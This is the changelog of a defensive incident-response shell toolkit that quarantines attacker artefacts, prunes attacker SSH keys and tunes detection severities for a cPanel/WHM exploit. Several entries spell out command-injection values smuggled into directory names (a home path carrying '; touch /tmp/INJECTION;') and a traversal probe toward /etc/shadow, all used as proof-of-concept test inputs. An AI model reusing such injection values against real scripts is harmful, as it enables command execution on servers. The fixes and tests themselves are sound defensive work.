# Changelog

All notable changes to sessionscribe-mitigate.sh and the surrounding
toolkit are recorded here. Format follows [Keep a Changelog](https://keepachangelog.com/),
versioned per the affected component.

## sessionscribe-mitigate.sh v0.7.3 — 2026-05-03

### Security
- **SHOULD-FIX (defense-in-depth): consume-time path re-validation in
  `prune_ssh_keys_from_manifest`.** v0.7.2's MUST-FIX closed the
  trap-injection vector at the manifest-build emit-site
  (`kill_sshkey_canonical_paths` filters every emitted path through
  `kill_sshkey_path_safe`). The manifest-consume site
  (`prune_ssh_keys_from_manifest`) still trusted the manifest's `path`
  field verbatim and passed it directly to `ssh_keys_prune`, which
  installs the SIGINT/SIGTERM trap at line 1066/1068 with `$path`
  embedded. Threat model:

    1. Operator runs `--check` under v0.7.0 mitigate (pre-fix).
       Manifest is emitted with a hostile path baked in.
    2. Operator upgrades mitigate to v0.7.2.
    3. Operator runs `--apply --kill` against the same stale manifest
       (manifests are persisted to `$BACKUP_DIR/kill-manifest.json` and
       can legitimately be re-applied days later).
    4. `prune_ssh_keys_from_manifest` reads the hostile path from the
       v0.7.0 manifest, calls `ssh_keys_prune`, and the trap-string
       expansion fires on SIGINT during the 10s lock-retry window.

  Low-probability but operator-realistic — closes the only remaining
  reachability path for the v0.7.2 trap-injection vector.

  Fix: re-validate the manifest path against `kill_sshkey_path_safe`
  immediately after extraction in `prune_ssh_keys_from_manifest`,
  before any call to `ssh_keys_prune`. Refused rows record a new
  `refused_hostile_path` action with a diagnostic detail noting the
  likely stale-pre-v0.7.2 origin, then `continue` to the next item.
  No `ssh_keys_prune` call → no trap installed → no expansion vector.

### Added
- **Result vocabulary: `refused_hostile_path`.** New apply-only sshkey
  result, emitted by `prune_ssh_keys_from_manifest` when a manifest
  row's path fails the consume-time `kill_sshkey_path_safe` filter.
  Wired into `kill_compute_verdict` (sidecar branch + manifest
  fallback) as total_skip with WARN-promote (mirrors
  `kept_unlabeled_warned` semantics — operator must hand-investigate
  the stale manifest). Also wired into `finalize_manifest`'s awk
  classifier (sshkey-clean bucket).

- **Cross-reference comment between the two path-validation
  primitives.** `kill_path_in_allowlist` (lighter cntrl-byte +
  traversal filter for IOC-quarantine allowlist gating) now carries
  a one-line pointer to `kill_sshkey_path_safe` (stricter shell-
  context filter for paths that flow into trap strings, eval
  contexts, or operator-paste recovery hints). Drift-prevention so
  future call-sites pick the right primitive on first read.

### Verification
- 49/49 → 50/50 P1+P2+P3+v0.7.1+v0.7.2+v0.7.3 unit tests pass under
  `MITIGATE_LIBRARY_ONLY=1 MITIGATE_RUN_P1_TESTS=1`. One regression
  test added: 50 ('kill_sshkey_path_safe runtime trap-injection PoC
  blocked by consume-time gate'). Test 50 synthesizes a stale-pre-
  v0.7.2 manifest carrying a hostile path (`/home/x";touch
  $T/INJECTION_PROOF;"y/.ssh/authorized_keys`), drives
  `prune_ssh_keys_from_manifest` against it under MODE=apply, and
  asserts: (1) sidecar contains `"result":"refused_hostile_path"`,
  (2) sidecar contains zero `"result":"pruned_ok"` rows,
  (3) no INJECTION_PROOF file was created during the call,
  (4) `kill_compute_verdict` returns WARN. This test is deeper than
  test 47 (which exercises the build-time gate) — it bypasses the
  build-time filter by handing a hostile path directly to the apply-
  path consumer, the only place a stale manifest could re-introduce
  the v0.7.2 trap-injection vector.
- `bash -n`, `shellcheck -S error`, `shellcheck` (delta = 0 new
  findings vs v0.7.2 baseline; same SC code coverage, only line
  numbers shifted by the +40-line additions).
- bash 4.1.2 / gawk 3.1.7 floor preserved (no new `{n}` intervals,
  no 3-arg `match`, no `flock -w`).

## sessionscribe-mitigate.sh v0.7.2 — 2026-05-03

### Security
- **MUST-FIX: `ssh_keys_prune` SIGINT/SIGTERM trap-string command
  injection.** Lines 1066/1068 set `trap "rm -f \"$tmp\" \"$class_tmp\"
  2>/dev/null; exit 130" INT` (and 143 for TERM) where `$tmp` =
  `"$path.kill-prune-tmp.$$"` and `$path` flows from
  `kill_sshkey_canonical_paths` (root home from `getent passwd root |
  cut -d: -f6` and `/home/<user>` from `find /home -maxdepth 1`).
  Linux directory names CAN legally contain `"`, `;`, `$`, `` ` ``,
  `\`, `&`, `|`, `<`, `>`, `*`, `?`, `!`, `'`, parens/braces/brackets.
  A SessionScribe-compromised WHM (the very threat this script
  defends against) can create a cPanel user `x"; touch
  /tmp/INJECTION; "y` whose home `/home/x"; touch /tmp/INJECTION;
  "y` flows through canonical-paths into the trap string. At
  trap-set time bash expands `$tmp`, producing a trap body that —
  on SIGINT during the 10s `flock -x -n` retry loop — executes
  the injected command. PoC verified live: hostile path expansion
  followed by `kill -INT $$` creates `/tmp/INJECTION_PROOF`. The
  v0.6.1 `kill_path_in_allowlist` gate (line 1589) only refuses
  `[[:cntrl:]]`, NOT shell metacharacters, so the path passes the
  allowlist and reaches `ssh_keys_prune` intact.

  Fix: new `kill_sshkey_path_safe` helper rejects paths containing
  any of `" ; $ \` `` ` `` `\ & | < > * ? ! ' ( ) { } [ ]`, newline,
  tab, or any `[[:cntrl:]]` byte. `kill_sshkey_canonical_paths`
  now filters both the root-home path and every `/home/<user>`
  directory through this helper before emission; refused paths
  emit a `say_warn` (operator must rename the dir to prune those
  keys). All downstream consumers (trap-string expansion at 1066
  /1068, recovery_hint, sidecar header, manifest path field)
  inherit the filtered set.

  Regression: test 47 ('kill_sshkey_path_safe refuses
  shell-metachars; canonical-paths drops hostile dir
  (trap-injection blocked)') under `MITIGATE_LIBRARY_ONLY=1
  MITIGATE_RUN_P1_TESTS=1`. Probes the helper against 18
  metacharacter classes individually + one clean-path control,
  then synthesizes an end-to-end emit by overriding `find` to
  return one safe `/home/cpaneluser` + one hostile `x";touch
  $T/INJECTION;"y` path and `getent` to return a safe root
  home, asserts the hostile path is filtered out of
  `kill_sshkey_canonical_paths` output AND no `INJECTION` file
  is created during the synthesis.

### Fixed
- **SHOULD-FIX-1: `kill_sshkey_recovery_hint` shell-quotes both paths
  (defense-in-depth).** Line 1376 emitted `cp -a %s %s &&
  restorecon -F %s` with bare `$path` substitutions. Even after
  the canonical-paths metacharacter filter (security fix above)
  blocks hostile paths from being emitted in normal flow, an
  operator-pasted recovery_hint under incident stress remains a
  second-line target if a future code path bypasses the filter
  (e.g., manual envelope with attacker-controlled path in the
  manifest).

  Fix: wrap each path argument in single-quotes with
  `'\''`-escape for embedded single-quotes. The output now reads
  `cp -a '<mirror>' '<path>' && restorecon -F '<path>' 2>/dev/null
  && systemctl reload sshd`. Operator paste-execute is now
  injection-safe regardless of upstream filter state.

  Regression: test 48 ('recovery_hint shell-quotes paths (incl.
  embedded single-quote round-trip)') asserts the byte-exact
  output for a normal path AND for `/home/o'malley/.ssh/
  authorized_keys` round-tripping through the `'\''` escape.

- **SHOULD-FIX-2: `finalize_manifest` patches `result_detail` and
  `sha256_pre` on apply-mode kind:sshkey rows.**
  `kill_sshkey_emit_manifest_item` writes `"result_detail":null,
  "sha256_pre":null,"sha256_post":null` in apply mode (the K1
  emit path; sidecar carries the real values). The v0.7.0
  `kill_sidecar_to_lookup` sshkey case only emitted `result` +
  `sha256_post` rows; the `finalize_manifest` awk pass only
  patched those two fields. Result: an apply-mode manifest's
  kind:sshkey items kept `result_detail` and `sha256_pre` as
  `null` after the prune ran successfully — audit-completeness
  gap on every successful prune.

  Fix: `kill_sidecar_to_lookup` now also emits `sha256_pre` and
  `result_detail` rows; the `finalize_manifest` awk patcher's
  `kind:sshkey` branch now patches both alongside the existing
  `sha256_post` and `result` patches.

  Regression: test 49 ('finalize_manifest patches kind:sshkey
  result_detail + sha256_pre + sha256_post') drives
  `prune_ssh_keys_from_manifest` against a planted file with one
  attacker key in --apply mode, calls `finalize_manifest` against
  a synthesized minimal manifest, then asserts the kind:sshkey
  row contains `"result":"pruned_ok"`, a non-null
  `result_detail` matching `[^"]*key\(s\) pruned[^"]*`, and a
  non-null `sha256_pre` matching `[0-9a-f]{64}`.

### Verification
- 46/46 → 49/49 P1+P2+P3+v0.7.1+v0.7.2 unit tests pass under
  `MITIGATE_LIBRARY_ONLY=1 MITIGATE_RUN_P1_TESTS=1`. Three
  regression tests added: 47 (MUST-FIX trap-injection metachar
  gate), 48 (SHOULD-FIX-1 recovery_hint shell-quote), 49
  (SHOULD-FIX-2 finalize_manifest sshkey detail+sha256_pre patch).
- `bash -n`, `shellcheck -S error`, `shellcheck` (delta = 0 new
  findings vs v0.7.1 baseline; SC2317/SC2016 in test 47 scaffold
  suppressed via inline `# shellcheck disable=` directives that
  acknowledge the function-override-via-indirect-call pattern).
- bash 4.1.2 / gawk 3.1.7 floor preserved (no new `{n}` intervals,
  no 3-arg `match`, no `flock -w`).

## sessionscribe-mitigate.sh v0.7.1 — 2026-05-03

### Fixed
- **`ssh_keys_prune`: sidecar `*.removed-keys` JSONL escapes attacker-
  controlled comment field.** Step 14's awk `printf` wrote the comment
  field (`$4` from `class_tmp`) verbatim, so an attacker-planted comment
  containing `"` or `\` produced malformed JSON that `jq` and
  `json.loads()` reject. The main `kill-manifest.json` already passes
  every value through `json_esc()` at the bash level (line 1432); only
  the per-file sidecar lacked escaping. Defeats chain-of-custody when
  responder pipelines parse the sidecar.

  Fix: inline awk `jesc()` function inside the JSONL emit block,
  mirroring `json_esc()`'s `\\` then `\"` ordering. Tabs/CR/LF cannot
  reach this field — the parser collapses `[[:space:]]+` to a single
  space — so the two-substitution form is sufficient. Defensive: the
  same `jesc()` is also applied to the keytype + fingerprint fields,
  which are alphanumeric+colon+dash by construction but get the wrap
  for free.

  Regression: test 45 ('sidecar JSONL escapes attacker comment quote+
  backslash') under `MITIGATE_LIBRARY_ONLY=1 MITIGATE_RUN_P1_TESTS=1`
  plants a key with `"` and `\` in the comment, runs `ssh_keys_prune`
  in apply mode, then asserts every JSONL record in the resulting
  sidecar parses cleanly via `python3 -c 'import json; json.loads(...)'`
  with the comment field round-tripping the original literal.

- **`ssh_keys_prune`: leading-whitespace key lines counted in step-10
  verify.** Step 10's `grep -cE '^[^[:space:]#]'` excluded indented key
  lines from the post-rewrite tmp count. Indented authorized_keys
  entries are rare but legal per `sshd(8)` AUTHORIZED_KEYS FILE FORMAT,
  and the classifier preserves the original line bytes (including
  leading whitespace) when emitting through `sed -n "${ln_no}p"`. So
  a file that started with `   ssh-rsa AAAA Parent Child key for X`
  was rewritten correctly but the verify said `tmp line-count 0 !=
  expected 1`, returning `prune_failed` and triggering the operator-
  visible `KILL_LAST_PRUNE_DETAIL` mismatch warning. Fail-safe (the
  rewrite was already correct; the verify just lied).

  Fix: replace `grep -cE` with an awk count that skips blank +
  comment-only lines (under both leading-whitespace and unindented
  shapes) and counts everything else.

  Regression: test 46 ('prune leading-whitespace key kept; attacker
  key removed') plants `   ssh-rsa AAAA Parent Child...\nssh-rsa BBBB
  evil@host\n`, asserts `KILL_LAST_PRUNE_RESULT=pruned_ok` and that
  the indented Parent-Child line survived while the attacker key was
  removed.

- **`kill_sshkey_canonical_paths`: `find -maxdepth 2` produced
  non-canonical paths.** `find /home -maxdepth 2 -mindepth 1 -type d`
  returns BOTH depth-1 user homes (`/home/<user>`) and depth-2
  subdirs (`/home/<user>/<sub>`). Appending `/.ssh/authorized_keys`
  to depth-2 subdirs produced paths like
  `/home/<user>/<sub>/.ssh/authorized_keys` that are not the canonical
  authorized_keys path. Mostly cosmetic — the build-time `[[ -f ]]`
  skip filtered most non-existent paths — but the supersede check
  (`kill_sshkey_path_canonical`) does an exact-match lookup, so a
  Pattern G IOC at a depth-2 path could be misclassified. Mirrored
  the same pattern in `sessionscribe-ioc-scan.sh`'s
  `pattern_g_deep_checks` (separate v2.7.7 commit).

  Fix: `-maxdepth 1` (depth-1 only). Trust-regex sync gate still
  passes since the regex literal is unchanged.

### Verification
- 44/44 → 46/46 P1+P2+P3 unit tests pass under
  `MITIGATE_LIBRARY_ONLY=1 MITIGATE_RUN_P1_TESTS=1`. Two regression
  tests added: 45 (A-02 sidecar JSONL escape) + 46 (A-03 leading-
  whitespace count).
- bash 4.1.2 / gawk 3.1.7 floor preserved (no new `{n}` intervals,
  no 3-arg `match`, no `flock -w`).

## sessionscribe-mitigate.sh v0.7.0 — 2026-05-03

### Added
- **`phase_kill` ssh-key surgical prune** (`--ssh-prune`) sweeps canonical SSH-key paths (`~root/.ssh/authorized_keys{,2}` + every `/home/*/.ssh/authorized_keys{,2}`) and surgically removes any key whose comment doesn't match the LW trust regex (`Parent Child key for [A-Z0-9]{6}` + `lwadmin`/`lw-admin`/`liquidweb`/`nexcess` prefixes). Per-line precision — Parent Child provisioning key preserved while attacker-planted keys are quarantined.
- **`--ssh-allow REGEX`** for site-specific trust-regex extensions. Repeatable; values concatenated via `|`. Validated as POSIX ERE at parse time against empty + non-empty input probes; overly broad patterns (`.*`, `.+`, `''`, `.`) emit a WARN.
- **`--ssh-allow-lockout`** to authorize full root-key wipes on hosts where every key would be pruned. Off by default — the `would_lock_out` gate is fail-safe.
- **`--ssh-prune-unlabeled`** to also prune empty-comment keys. Default policy KEEPS unlabeled keys with WARN, since real fleets have unlabeled root keys (cloud-init, ansible templates, sysadmin paste); silent default prune was too high-blast-radius.
- **`--ssh-allow-drift`** to bypass the trust-regex sync gate. Off by default — drift between mitigate's `KILL_SSH_TRUST_RE` and ioc-scan's `SSH_KNOWN_GOOD_RE` refuses to run `--ssh-prune` (defense against silent regex drift that could mis-classify operator keys).
- **New `kind:sshkey` manifest item class** with chain-of-custody:
  - sha256 pre/post rewrite verification
  - pre-vs-lock-acquired sha256 catches mid-flight modification (`concurrent_modification`)
  - post-mv re-classify catches clobber-after-our-rename (`clobbered_post_mv`)
  - original whole file preserved at `BACKUP_DIR/quarantine/<path>.original-pre-prune`
  - pruned-keys JSONL sidecar at `BACKUP_DIR/quarantine/<path>.removed-keys`
  - `recovery_hint` field per item carrying a single-line `cp -a` restore command for paged-out 3am operators.
- **`kind:sshkey` summary fields** in the manifest summary block: `sshkeys_files_planned`, `sshkeys_files_pruned`, `sshkeys_files_clean`, `sshkeys_files_kept_unlabeled`, `sshkeys_files_lock_out`, `sshkeys_files_failed`, `sshkeys_files_concurrent_mod`, `sshkeys_files_lock_contended`, `sshkeys_keys_pruned`, `sshkeys_keys_kept`, `sshkeys_keys_kept_unlabeled`.

### Behavior
- When `--ssh-prune` is active, Pattern G whole-file quarantine is suppressed for canonical authorized_keys paths (`action:"superseded_by_sshkey"` — manifest-visible audit, no double-action). Off-path SSH key material continues to use whole-file quarantine.
- `--ssh-prune` respects the `host_verdict==COMPROMISED` gate. For fleet-wide hygiene runs (rotate keys regardless of compromise verdict), use `--ssh-prune --kill-anyway`.
- Empty-comment keys (e.g., bare `ssh-rsa AAAA` with no comment) are KEPT by default with verdict-promote-WARN (`kept_unlabeled_warned`). Pass `--ssh-prune-unlabeled` to also remove them.
- All sshkey actions are recorded in the kill-actions sidecar (`<manifest>.actions.jsonl`); verdict is computed from the sidecar in `--apply` and from the manifest's planned items in `--check`.

### Floor compliance
- **bash 4.1.2 / gawk 3.1.7** — no `mapfile`, no `${var,,}`, no `printf -v arr[$i]`, no `${var: -1}`, no `declare -g`, no `local -n`, no `wait -n`, no `coproc`, no `${var@Q}`. No 3-arg `match()`, no `{n}` interval expressions in awk regexes.
- **coreutils 8.4** — `cp --preserve=all` honored; `realpath -m` not relied on (uses the v0.6.1 pure-bash normalizer for path-allowlist).
- **util-linux 2.17** — NO `flock -w` (timeout flag is util-linux 2.21+). Lock contention handled by `flock -x -n` retry loop with 1-second sleep, default 10 attempts.
- **OpenSSH 5.3** (EL6) — `ssh-keygen -lf` MD5 fingerprint for RSA/DSA/ECDSA; base64-decoded sha256 fallback (`B64SHA256:...`) for ed25519 + FIDO/U2F (`sk-ssh-ed25519`, `sk-ecdsa-sha2-*`) keytypes that EL6's ssh-keygen can't parse.

### Note
- This release supersedes the earlier v0.7.0 reservation in PLAN-killchain.md K9 ("Reverse / un-quarantine"). Restore tooling defers to v0.8.0, covering both file un-quarantine and ssh-key un-prune. The v0.7.0 prioritization reflects active threat containment urgency: a fleet-wide surgical SSH-key prune capability is more time-sensitive than restore tooling.

## sessionscribe-mitigate.sh v0.6.1 — 2026-05-03

### Fixed
- **`kill_path_in_allowlist`: path-traversal bypass on EL6 floor.** Two
  cascading coreutils-8.4 issues let the allowlist fail-open on
  non-existent traversal paths:
  1. `realpath -m` is coreutils 8.15+. EL6 ships 8.4. On hosts where a
     third-party `realpath` exists *without* `-m`, `have_cmd realpath`
     returned 0 and `realpath -m` errored "invalid option" - the
     surrounding `2>/dev/null || return 1` then refused **every** path,
     making `phase_kill` a silent no-op.
  2. The `readlink -f` fallback requires every intermediate path
     component to exist. For traversal probes such as
     `/home/foo/../../etc/shadow` (where `/home/foo` is absent),
     `readlink -f` returned empty; the fallback kept the unresolved
     string, the `case` statement matched `/home/*`, and the allowlist
     was bypassed.

  Fix: three-part defense.
  - **Refuse on `..` presence** (new shape probe). The IOC scanner
    writes paths absolute + already normalized at source; any `..` in
    a path reaching `kill_path_in_allowlist` is intent-hidden
    traversal. Reject before resolution. Stricter than collapse-then-
    match (`/home/x/../etc/shadow` would collapse to
    `/home/etc/shadow` and slip past the `case` on `/home/*`).
  - **Probe `realpath -m`** with a `realpath -m / >/dev/null` smoke
    test before relying on the flag - so a third-party realpath
    without `-m` doesn't fail-closed-on-everything.
  - **Pure-bash fallback** (`kill_normalize_abs_path`) collapses `/./`
    and `/../` segments without filesystem access, so the gate works
    on EL6 hosts that have neither `realpath -m` nor a `readlink -f`
    that handles non-existent intermediate directories.

  bash 4.1 / set -u / gawk 3.x floor preserved (no `local -n`, no
  `mapfile`, empty-array iteration guarded).

### Cleanup
- **`finalize_manifest`: dead awk code removed.** The `lookup_summary_orig()`
  function read from `ORIG_SUMMARY[]`, an array that was never populated
  (no `awk -v` for it, no `BEGIN` block read it from the manifest). It
  always returned `"0"` and the post-awk `sed -i` pass overwrote the
  result anyway. Replaced the awk re-emission of `files_planned` /
  `ips_planned` / `files_refused` with literal `"0"` placeholders;
  the existing `sed` pass remains the single source of truth for those
  three counters. Also dropped the unread `csf_keys[lkey] = 1`
  assignment in the lookup-load loop.

## sessionscribe-mitigate.sh v0.6.0 — 2026-05-03

### Added
- **`phase_kill`: targeted quarantine + IP block from an IOC envelope.**
  New opt-in phase consuming `sessionscribe-ioc-scan` envelope JSON to
  perform manifest-driven cleanup of bad-actor access on a host.
  Default-off; opt-in via `--kill`. Gated on `host_verdict == COMPROMISED`
  (override: `--kill-anyway`).
- **CLI flags:** `--kill`, `--envelope PATH`, `--kill-anyway`,
  `--no-kill`. `--envelope PATH` and `--kill-anyway` imply `--kill`.
- **Manifest-driven actions** at `$BACKUP_DIR/kill-manifest.json`
  (audit-trail source of truth):
  - **File quarantine:** Pattern A/C/D/F/G/H/I/J on-disk evidence is
    *moved* (never deleted) to `$BACKUP_DIR/quarantine/<mirrored-path>`
    with sha256 chain-of-custody (`sha256_pre`, `sha256_post`, `size`,
    `dest`). Cross-filesystem moves fall back to cp -a + rm. Result
    vocabulary: `ok | gone | refused_special_file | mv_failed |
    rm_failed_after_copy | corrupt_during_move`.
  - **Per-incident IP blocks** via `csf -d <ip> "sessionscribe ioc=<key>
    run=<run_id>"`. RFC1918 / loopback / link-local / multicast / shape-
    malformed IPs refused (envelope-injection guard). IPv4 + IPv6
    supported. Idempotent vs `/etc/csf/csf.deny` (gawk-3.x literal-
    equality check, no regex-escape).
  - **rfxn fleet blocklist registration** via `/etc/csf/csf.blocklists`
    (verified against aetherinox/csf-firewall docs since ConfigServer
    shut down). Idempotent insert of
    `RFXN_FH_L2L3|86400|0|https://cdn.rfxn.com/downloads/rfxn_fh-l2_l3_webserver.netset`.
    Probes `LF_IPSET` and flips 0->1 in `--apply` (with `backup_file`).
    CSF handles fetch + cache + ipset binding on its own schedule.
- **Path allowlist + envelope-injection guards** (`kill_path_in_allowlist`):
  Refuses any path outside documented mutable roots (/root/, /home/*/,
  /etc/profile.d/, /etc/systemd/system/, /etc/udev/rules.d/,
  /etc/cron.d/, /etc/cron.{hourly,daily,weekly,monthly}/,
  /var/spool/cron/, /usr/local/cpanel/var/). Pre-resolution shape
  probes: absolute path required; no control chars (NUL/newline/tab/
  ESC); `realpath -m` resolves symlinks + .. components (readlink -f
  fallback). Refused items recorded in manifest as `action:"refused"`,
  never reach the K3 quarantine logic.
- **Sidecar action stream** at `$BACKUP_DIR/kill-manifest.actions.jsonl`
  (one JSON record per action). `finalize_manifest` merges the sidecar
  into the manifest at K6, populating `ts_applied`, the `csf{}` block,
  and the `summary{}` counters (`files_quarantined`, `files_failed`,
  `files_gone`, `files_special`, `ips_blocked`, `ips_skipped`,
  `ips_failed`).
- **`--list-phases`** now lists `kill   no   (opt-in) targeted
  quarantine + IP block from IOC envelope (--kill)`.

### Compatibility
- bash 4.1.2 / gawk 3.1.7 / coreutils 8.4 floor (CL6/EL6) preserved.
  Zero `mapfile`/`readarray`/`${var: -1}`/`declare -g`/`local -n`/
  `wait -n`/`coproc` in kill-chain helpers. Zero 3-arg `match()` and
  zero `{n}` interval expressions in awk regex blocks. All array
  iterations stream via `while-read` (no unguarded for-in under
  `set -u` + bash 4.1).
- `jq` opportunistic, never required: K1 manifest builder + K6
  finalizer use bash + awk only. `jq` is convenient for inspecting
  the output but is not a runtime dependency.
- CSF version floor: any version supporting `/etc/csf/csf.blocklists`
  + `LF_IPSET=1` (universal across the fleet's CSF versions).

### Operator runbook
- `.rdf/work-output/k8-lab-runbook.md` — seven-scenario lab E2E with
  the CL6 floor verification gate. Walks through opt-in confirmation,
  gate firing, dry-run, full apply, idempotent re-apply, allowlist
  refusal, and failure-mode rehearsal (cross-fs mv, CDN unreachable,
  malformed IP, traversal).

## sessionscribe-ioc-scan.sh v2.7.15 — 2026-05-04

### Changed
- **Demote `ioc_cve_2026_41940_access_primitive` (the watchTowr X stack) from
  `strong` → `warning`.** Single-emit-site change at `check_crlf_access_primitive`
  (line 4931). Aligns the verdict-math ladder with the documented compromise
  taxonomy in `PATTERNS_UPDATED.md`:

  - **PATTERNS_UPDATED.md line 386-408 (kill-chain summary)** classifies the
    CVE-2026-41940 CRLF Authorization: Basic exploit as **step 1 of 8**:
    initial access. Steps 2-8 are JSON-API recon, reseller persistence,
    persistence layer (G/I/J), websocket Shell RCE (E), automated harvester
    (F), second-stage backdoor (K), and destruction (A/B/C/H/L). The X stack
    is the *entry condition* of the chain, not the chain itself.
  - **PATTERNS_UPDATED.md line 420 (verification workflow)** is the canonical
    rule: *"Only escalate to rooted-restore if BOTH the rfxn scan AND any
    one of Pattern A/B/C/D/E/F/G/H/I/J/K/L IOCs land."* The X stack is the
    rfxn scan input; the A-L pattern is the gate. Pre-v2.7.15 the X stack
    was both input and gate, which collapses the two-AND-clause requirement
    into a single OR clause and inflates COMPROMISED counts.

  At `warning ioc_*` the signal still ticks `ioc_review++` (aggregate_verdict
  line 7762) and routes the host to SUSPICIOUS — the correct ATTEMPT-tier
  disposition per the user-facing v3 verdict ladder ("only post-attack
  activity = COMPROMISED; X stack / watchTowr / T1-origin = ATTEMPT").
  It just stops ticking `ioc_critical++` (line 7752), so it no longer
  auto-escalates to COMPROMISED when fired in isolation.

  **Compound-evidence hosts retain their COMPROMISED verdict via the other
  strong-tier paths**, untouched by this release:

  | X stack co-fires with | COMPROMISED carrier (unchanged) |
  |-----------------------|----------------------------------|
  | Any of Pattern A/B/C/D/F/G/H/I/J/K/L destruction or persistence | 22 strong destruction emits at line 6024-7325 |
  | Pattern E (full chain: CRLF anchor + post-CRLF + 2xx-proximity) | strong emit at line 7086 (gate logic 7050-7090) |
  | Pattern E handoff burst (≥2 IPs, 15min window) | strong emit at line 7154 |
  | Session-file forensics (token_inject, token_used_2xx, hasroot, cve41940_combo) | 4 strong emits at line 5151-5325 |
  | `ioc_attacker_ip_2xx_on_cpsess` post-CRLF (token consumption) | strong emit at line 4833 (gate logic 4814-4828) |

  Net: only **X-stack-only hosts** (CRLF chain detected in access_log,
  no destruction residue, no session-file evidence, no successful token
  consumption observed) demote from COMPROMISED to SUSPICIOUS. These are
  the canonical *attempted but not corroborated* hosts — the host was
  exploited at the access primitive, but no follow-up activity tied to
  the chain has been detected. Per the verification workflow, those hosts
  now correctly route to "needs investigation" rather than "rooted-restore."

  **Side-effect preserved:** `LOGS_CRLF_CHAIN_FIRST_EPOCH` is set
  unconditionally on `crlf_hits > 0` (line 4944) — the global anchor
  used by downstream Pattern E + 2xx_on_cpsess gates is set regardless
  of the access_primitive emit's severity. The chain-corroboration logic
  for the strong-tier promotion of those signals is unchanged.

  **Weight reduction 10 → 4:** at warning tier, weight does not increment
  `score` (aggregate_verdict only adds weight on `strong` and 2 on
  `evidence`), so the numeric weight is informational. Reduced to 4 for
  consistency with other warning ioc_* weights (Pattern E
  `_unknown_dim_only` was 4, `_probes` 3 prior to v2.7.14 demotion).

  **Note text rewritten:** pre-v2.7.15 read *"Deterministic
  CVE-2026-41940 exploitation evidence (CRITICAL)"* — operator-misleading
  at warning tier. Now reads *"CVE-2026-41940 exploitation ATTEMPT —
  confirm compromise via Pattern A-L residue or session-file forensics
  (REVIEW)"*. Routes operator attention correctly to the corroboration
  step instead of immediate destructive action.

  **Downstream consumer note for forge `records.jsonl` queries:**
  filters on `severity=="strong" && id=="ioc_cve_2026_41940_access_primitive"`
  must shift to `severity=="warning"`. The `key` field
  (`ioc_cve_2026_41940_crlf_access_chain`) is unchanged. Filters on
  `ioc_critical >= 1` will see ~300-400 fewer hosts; filters on
  `ioc_review >= 1` will see ~300-400 more. The strong-tier
  `ioc_attacker_ip_2xx_on_cpsess` is the right signal for "successful
  token consumption" queries — that's the chain-corroborated equivalent.

### Rationale
v2.7.14 cleared the warning-tier noise floor. v2.7.15 closes the
strong-tier inflation: the watchTowr access primitive was the single
largest source of false-COMPROMISED verdicts in the fleet (~418 hosts
in the 2026-05-04 pull). Demoting to warning ioc_* preserves the
forensic value of the signal (still in REASONS, still routes to
SUSPICIOUS, still anchors Pattern E + 2xx_on_cpsess gates) while
correctly placing it on the ATTEMPT side of the verdict ladder
documented in `PATTERNS_UPDATED.md` and the user-facing v3 ladder.

Together with v2.7.14, this completes the deterministic
CLEAN/SUSPICIOUS/COMPROMISED separation: COMPROMISED requires
post-attack residue (Pattern A-L strong, session-file forensics, or
multi-gate Pattern E/2xx_on_cpsess); SUSPICIOUS captures attempt
evidence (X stack, warning-tier ioc_* artifacts); CLEAN captures
hosts with at most probing/recon activity (advisory + info tier).

### Floor
bash 4.1.2 / gawk 3.1.7 / coreutils 8.4 (CL6/EL6) preserved. Change
is a string literal swap (`"strong"` → `"warning"`) + numeric literal
swap (`10` → `4`) + comment block additions + note text rewrite.
Zero new bash features, zero new builtins, zero new external commands.

## sessionscribe-ioc-scan.sh v2.7.14 — 2026-05-04

### Changed
- **Determinism pass: drop `ioc_*` warning-tier emits that the emitter
  itself labels benign down to `advisory`.** Fleet observation across
  the 2026-05-04 records.jsonl pull (15K hosts) showed three signals
  driving the bulk of false-SUSPICIOUS verdicts despite their own note
  strings flagging the activity as legitimate or attempt-only:

  | Signal | Old sev | New sev | Hosts (warning-tier) | Emitter's own note |
  |--------|---------|---------|----------------------|--------------------|
  | `ioc_pattern_e_websocket` (`_unknown_dim_only`) | warning | advisory | ~3,500 | "likely legitimate WHM Terminal admin sessions from non-canonical browsers" |
  | `ioc_pattern_e_websocket` (`_probes`)           | warning | advisory | (subset of above) | "all rejected, no 2xx (REVIEW)" |
  | `ioc_pattern_e_unknown_dimension`               | warning | advisory | ~3,400 | "possible new operator (REVIEW)" |
  | `ioc_attacker_ip_probes_only`                   | warning | advisory | ~3,500 | "all rejected (probing only, no successful response)" |

  Per the verdict-ladder convention (memory:
  `feedback_compromise_confidence`): only post-attack residue
  (Pattern A/B/C/F/H/D destructive markers + token_used_2xx) =
  COMPROMISED; attempt signals (X stack, T1-origin attacker IPs,
  unsuccessful probes) = ATTEMPT. Probes-only and unknown-dim-only
  fall on the ATTEMPT side, which routes to advisory not warning.
  At `warning ioc_*` they tick `ioc_review++` in `aggregate_verdict`
  (line 7762) and route the host to SUSPICIOUS; at `advisory` they do
  not. The signal is preserved (still surfaced in REASONS via the
  advisory_count summary, still queryable in records.jsonl) — only
  the host_verdict ladder placement changes.

  Net fleet impact projected on the next pull: SUSPICIOUS host count
  drops from ~7K to ~500 (host-level overlap heavy across the four
  flips, so the unique-host drop is ~4-4.5K not the additive 10.4K).
  COMPROMISED count is unchanged — `strong destruction.ioc_pattern_*`
  still gates COMPROMISED via `ioc_critical++` (line 7752), and none
  of these flips touch the strong-tier branches.

  **Downstream consumer note for forge `records.jsonl` queries:**
  filters on `severity=="warning" && id=="ioc_pattern_e_*"` or
  `severity=="warning" && id=="ioc_attacker_ip_probes_only"` should
  switch to `severity=="advisory"` for these four key paths. The
  strong-tier counterparts (`ioc_pattern_e_websocket_shell_hits`,
  `_pre_compromise`, `_orphan`) are unchanged and remain at strong.
  Fleet-rollup spreadsheets pivoting on `summary.inconclusive` will
  show a corresponding drop, with the offset appearing in
  `summary.advisories`.

- **Cap diagnostic sample emits to 1 per host.** `ioc_sample` (line
  4604) and `session_shape_sample` (line 5462) previously emitted up
  to 5 and 10 sample rows per host respectively, producing 14,767 and
  111,277 rows across the fleet. Both are already excluded from
  envelope reconcile (line 1881 skip-list) and carry weight=0 — they
  exist for triage context, not verdict math. Cap reduced to `head -1`
  in both call sites.

  Net fleet impact: records.jsonl shrinks by ~110K rows (~73% of
  total `info`-tier sample volume). Per-host queryability preserved —
  the first sample row per host still carries the same field shape
  (ip/status/path/log_file/ts_epoch/line/note). Operators wanting
  exhaustive sample listings should drop to envelope-level forensic
  output, which is unaffected.

  **Downstream consumer note:** any forge query relying on multiple
